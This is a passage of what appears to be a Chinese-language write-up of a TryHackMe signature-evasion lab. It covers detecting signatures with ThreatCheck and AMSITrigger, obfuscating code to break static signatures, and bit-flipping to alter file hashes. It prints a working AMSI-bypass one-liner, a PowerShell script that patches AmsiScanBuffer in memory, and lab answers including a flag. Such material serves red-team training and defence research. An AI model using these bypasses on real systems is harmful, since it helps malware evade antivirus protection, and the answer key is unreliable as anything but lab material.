74 00 61   ·1·}·,·&quot;·M·e·t·a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   ·&quot;·:·&quot;·{·2·}·&quot;·,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·&quot;·I·V·&quot;·:·&quot;·{·3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   ·}·&quot;·,·&quot;·E·n·c·r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   ·y·p·t·e·d·M·e·s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   ·s·a·g·e·&quot;·:·&quot;·{</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>就这么简单！无需其他配置或语法，我们可以直接修改工具以进行使用。为了高效地使用此工具，我们可以首先识别任何发现的恶意字节，然后递归地将其分解，再次运行该工具，直到没有识别到签名为止。</p>
<p>注意：可能会出现误报的情况，在这种情况下工具会报告没有恶意字节。这将需要您凭直觉来观察和解决；不过，我们将在第4个任务中进一步讨论这一点。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="amsitrigger">AMSITrigger<a href="#amsitrigger" class="hash-link" aria-label="Direct link to AMSITrigger" title="Direct link to AMSITrigger">​</a></h3>
<p>正如在<a href="https://tryhackme.com/room/runtimedetectionevasion" target="_blank" rel="noopener noreferrer">运行时检测规避</a>中所述，AMSI利用运行时，使签名更加难以识别和解决。ThreatCheck也不支持某些文件类型，例如AMSITrigger支持的PowerShell。</p>
<p>AMSITrigger将利用AMSI引擎扫描提供的PowerShell脚本中的函数，并报告它认为需要警报的特定代码段。</p>
<p>AMSITrigger在其GitHub上提供了预编译的版本，并且也可以在附带的机器的桌面上找到。</p>
<p>以下是AMSITrigger的语法用法。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:&gt;amsitrigger.exe --help</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-i, --inputfile=VALUE  		PowerShell 文件名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-u, --url=VALUE        		URL，例如 https://10.1.1.1/Invoke-NinjaCopy.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-f, --format=VALUE      	输出格式：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            1 - 仅显示触发器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            2 - 显示带行号的触发器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            3 - 显示与代码内联的触发器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            4 - 显示AMSI调用（圣诞树模式）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-d, --debug                 显示调试信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-m, --maxsiglength=VALUE 	最大签名长度，默认为2048</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-c, --chunksize=VALUE 		发送到 AMSIScanBuffer 的块大小，默认为4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-h, -?, --help 				显示帮助信息</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对于我们的用途，我们只需要提供一个文件和报告签名的首选格式。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; .\amsitrigger.exe -i bypass.ps1 -f 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue($null,$true)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在接下来的任务中，我们将讨论如何利用从这些工具收集的信息来突破签名。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>利用在本任务中获得的知识，使用ThreatCheck和Defender引擎识别<code>C:\Users\Student\Desktop\Binaries\shell.exe</code>中发现的恶意字节。ThreatCheck可能需要最多15分钟来找到偏移量，在此期间，您可以将其在后台运行，继续进行下一个任务，待其完成后再回来查看。</p><p>该文件的恶意字节结束位置在哪个偏移量？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0xC544</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="static-code-based-signatures---静态代码签名">Static Code-Based Signatures - 静态代码签名<a href="#static-code-based-signatures---静态代码签名" class="hash-link" aria-label="Direct link to Static Code-Based Signatures - 静态代码签名" title="Direct link to Static Code-Based Signatures - 静态代码签名">​</a></h2>
<p>﻿一旦我们确定了一个存在问题的签名，就需要决定如何处理它。根据签名的强度和类型，可以采用简单的混淆技术（详见 <a href="https://tryhackme.com/room/obfuscationprinciples" target="_blank" rel="noopener noreferrer">混淆原理</a>）来破坏签名，或者需要进行特定的调查和修正。在本任务中，我们旨在提供多种解决方案，以消除函数中存在的静态签名。</p>
<p><a href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf" target="_blank" rel="noopener noreferrer">分层混淆分类法</a> 详细介绍了最可靠的解决方案，这些方法属于 <strong>混淆方法</strong>（Obfuscating Methods）和 <strong>混淆类</strong>（Obfuscating Classes）两大类别。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="混淆方法">混淆方法<a href="#混淆方法" class="hash-link" aria-label="Direct link to 混淆方法" title="Direct link to 混淆方法">​</a></h3>
<table><thead><tr><th><strong>混淆方法</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>方法代理（Method Proxy）</td><td>创建一个代理方法或替换对象</td></tr><tr><td>方法散布/聚合（Method Scattering/Aggregation）</td><td>将多个方法合并为一个，或将一个方法拆散成多个</td></tr><tr><td>方法克隆（Method Clone）</td><td>创建一个方法的多个副本，并随机调用每个副本</td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="混淆类">混淆类<a href="#混淆类" class="hash-link" aria-label="Direct link to 混淆类" title="Direct link to 混淆类">​</a></h3>
<table><thead><tr><th><strong>混淆方法</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>类层次扁平化（Class Hierarchy Flattening）</td><td>使用接口为类创建代理</td></tr><tr><td>类拆分/合并（Class Splitting/Coalescing）</td><td>将局部变量或指令组转移到另一个类中</td></tr><tr><td>移除修饰符（Dropping Modifiers）</td><td>移除类修饰符（如 public、private）并将所有成员设为 public</td></tr></tbody></table>
<p>根据上表，尽管这些方法使用了特定的技术术语和概念，我们仍可将其归纳为一组适用于任何对象或数据结构的核心无关方法。</p>
<p><strong>类拆分/合并</strong> 与 <strong>方法散布/聚合</strong> 可以归纳为更广泛的概念，即对任何面向对象编程（OOP）函数的拆分或合并。</p>
<p>其他技术，如 <strong>移除修饰符</strong> 或 <strong>方法克隆</strong>，则可归纳为移除或模糊化可识别信息的更广泛概念。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="对象的拆分与合并">对象的拆分与合并<a href="#对象的拆分与合并" class="hash-link" aria-label="Direct link to 对象的拆分与合并" title="Direct link to 对象的拆分与合并">​</a></h3>
<p>拆分或合并对象的方法与在 <a href="https://tryhackme.com/room/signatureevasion" target="_blank" rel="noopener noreferrer">混淆原理</a> 中提到的连接目标非常相似。</p>
<p>该概念的基本原理相对简单，我们的目标是创建一个新的对象函数，既能够破坏原有签名，同时又能保持原有功能的完整性。</p>
<p>为了提供更具体的示例，我们可以参考 <a href="https://offensivedefence.co.uk/posts/covenant-profiles-templates/" target="_blank" rel="noopener noreferrer">知名案例研究</a> 中 Covenant 框架内 <code>GetMessageFormat</code> 字符串的处理方式。我们将首先查看该解决方案的原始实现，然后对其进行拆解并将其应用到混淆分类法中。</p>
<p><strong>原始字符串</strong></p>
<p>以下是被检测到的原始字符串：</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">string MessageFormat = @&quot;{{&quot;&quot;GUID&quot;&quot;:&quot;&quot;{0}&quot;&quot;,&quot;&quot;Type&quot;&quot;:{1},&quot;&quot;Meta&quot;&quot;:&quot;&quot;{2},&quot;&quot;IV&quot;&quot;:&quot;&quot;{3}&quot;&quot;,&quot;&quot;EncryptedMessage&quot;&quot;:&quot;&quot;{4}&quot;&quot;,&quot;&quot;HMAC&quot;&quot;:&quot;&quot;{5}&quot;&quot;}}&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><strong>混淆方法</strong></p>
<p>以下是用于替换并连接该字符串的新类。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public static string GetMessageFormat // Format the public method</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    get // Return the property value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        var sb = new StringBuilder(@&quot;{{&quot;&quot;GUID&quot;&quot;:&quot;&quot;{0}&quot;&quot;,&quot;); // Start the built-in concatenation method</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sb.Append(@&quot;&quot;&quot;Type&quot;&quot;:{1},&quot;); // Append substrings onto the string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sb.Append(@&quot;&quot;&quot;Meta&quot;&quot;:&quot;&quot;{2}&quot;&quot;,&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sb.Append(@&quot;&quot;&quot;IV&quot;&quot;:&quot;&quot;{3}&quot;&quot;,&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sb.Append(@&quot;&quot;&quot;EncryptedMessage&quot;&quot;:&quot;&quot;{4}&quot;&quot;,&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sb.Append(@&quot;&quot;&quot;HMAC&quot;&quot;:&quot;&quot;{5}&quot;&quot;}}&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return sb.ToString(); // Return the concatenated string to the class</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">string MessageFormat = GetMessageFormat</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>回顾本案例研究，类拆分技术用于创建一个新类，以存储用于连接字符串的局部变量。稍后在本任务及实战挑战中，我们将探讨如何识别何时使用特定的方法。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="移除和模糊化可识别信息">移除和模糊化可识别信息<a href="#移除和模糊化可识别信息" class="hash-link" aria-label="Direct link to 移除和模糊化可识别信息" title="Direct link to 移除和模糊化可识别信息">​</a></h3>
<p>移除可识别信息的核心概念类似于在 <a href="https://tryhackme.com/room/signatureevasion" target="_blank" rel="noopener noreferrer">混淆原理</a> 中提到的变量名混淆。在本任务中，我们进一步将其应用于任何对象（包括方法和类）中已识别的签名。</p>
<p>一个示例来自 Mimikatz，其中字符串 <code>wdigest.dll</code> 会触发警报。此问题可通过将该字符串替换为任意随机标识符来解决，并在所有实例中统一替换。根据混淆分类法，这属于方法代理（Method Proxy）技术。</p>
<p>这与 <a href="https://tryhackme.com/room/signatureevasion" target="_blank" rel="noopener noreferrer">混淆原理</a> 中讨论的内容几乎没有区别；然而，它是针对特定情境的具体应用。</p>
<hr>
<p>利用你在本任务中积累的知识，请使用 AmsiTrigger 对以下 PowerShell 代码片段进行混淆处理，以规避可视化签名检测。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$MethodDefinition = &quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#x27;Kernel32&#x27; -NameSpace &#x27;Win32&#x27; -PassThru;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$A = &quot;AmsiScanBuffer&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$handle = [Win32.Kernel32]::GetModuleHandle(&#x27;amsi.dll&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$Size = 0x5;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$ProtectFlag = 0x40;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$OldProtectFlag = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>完成充分的混淆后，请将代码片段提交至 <code>http://10.10.236.58/challenge-1.html</code>。文件名必须保存为 <code>challenge-1.ps1</code>。如果混淆正确，系统会以弹窗形式显示一个 flag。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>上传正确混淆的代码片段后，找到的 flag 是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{70_D373C7_0r_70_N07_D373C7}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="static-property-based-signatures---基于静态属性的签名">Static Property-Based Signatures - 基于静态属性的签名<a href="#static-property-based-signatures---基于静态属性的签名" class="hash-link" aria-label="Direct link to Static Property-Based Signatures - 基于静态属性的签名" title="Direct link to Static Property-Based Signatures - 基于静态属性的签名">​</a></h2>
<p>各种检测引擎或分析师可能会考虑不同的指标，而非仅仅依赖字符串或静态签名来支持他们的假设。签名可以附加到多个文件属性上，包括文件哈希、熵、作者、名称或其他可识别的信息，并可以单独使用或结合使用。这些属性通常在规则集如 <strong>YARA</strong> 或 <strong>Sigma</strong> 中使用。</p>
<p>某些属性可能很容易被篡改，而其他属性则可能更为复杂，特别是当处理预编译的闭源应用时。</p>
<p>本任务将讨论如何操作 <strong>文件哈希</strong> 和 <strong>熵</strong>，适用于开源和闭源应用。</p>
<p>注意：其他一些属性，如 PE 头信息或模块属性，也可以用作指标。由于这些属性通常需要代理或其他措施来检测，因此我们不会在本课程中涉及它们，以便将重点放在签名上。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="文件哈希">文件哈希<a href="#文件哈希" class="hash-link" aria-label="Direct link to 文件哈希" title="Direct link to 文件哈希">​</a></h3>
<p><strong>文件哈希</strong>，也称为 <strong>校验和</strong>，用于标记/识别一个唯一的文件。它们通常用于验证文件的真实性或已知的用途（是否恶意）。文件哈希通常很容易被修改，并且文件的任何修改都会导致哈希值的变化。</p>
<p>如果我们能够访问应用的源代码，可以修改代码的任意部分并重新编译，从而生成一个新的哈希值。这个解决方案比较直接，但如果我们需要处理一个已编译或签名的应用程序该怎么办？</p>
<p>处理已签名或闭源应用程序时，我们必须使用 <strong>位翻转</strong> 技术。</p>
<p>位翻转是一种常见的加密攻击方法，它通过翻转和测试每一个可能的位，直到找到一个可行的位。通过翻转一个有效的位，它将改变应用程序的签名和哈希值，同时保持所有功能不变。</p>
<p>我们可以使用脚本创建一个 <strong>位翻转列表</strong>，通过翻转每个位并生成一个新的 <strong>变异版本</strong>（大约 3000 到 200000 个变体）。以下是一个 Python 位翻转实现的示例。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">orig </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">list</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;rb&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orig</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	current </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">list</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orig</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	current</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">ord</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xde</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	path </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;%d.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	output </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> e </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> current</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token 